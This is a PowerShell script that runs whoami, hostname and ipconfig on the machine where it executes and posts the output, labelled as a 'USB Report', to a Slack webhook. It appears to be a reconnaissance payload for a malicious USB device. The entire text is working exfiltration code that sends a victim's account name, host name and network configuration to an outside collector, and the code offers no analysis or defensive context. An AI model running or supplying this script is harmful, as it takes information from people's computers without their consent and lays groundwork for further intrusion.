function Send-SystemInfoToSlackWebhook {
    $commands = @("whoami", "hostname", "ipconfig")
    $payload = "$name - USB Report`n`n"
    
    foreach ($cmd in $commands) {
        $output = Invoke-Expression -Command $cmd
        $output = $output -replace '\\', '\\\\' # Escape backslashes in the output
        $payload += "`n`n`$ $cmd`n$output"
    }
    $payload = '{"text": "```' + $payload + '```"}'
    
    $webRequest = [System.Net.WebRequest]::Create($webhookURL)
    $webRequest.Method = "POST"
    $webRequest.ContentType = "application/json"
    
    $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    $webRequest.GetRequestStream().Write($payloadBytes, 0, $payloadBytes.Length)
    
    $response = $webRequest.GetResponse()
    $responseStream = $response.GetResponseStream()
    $streamReader = New-Object System.IO.StreamReader($responseStream)
    $responseText = $streamReader.ReadToEnd()
    
    Write-Output $responseText
}

Send-SystemInfoToSlackWebhook
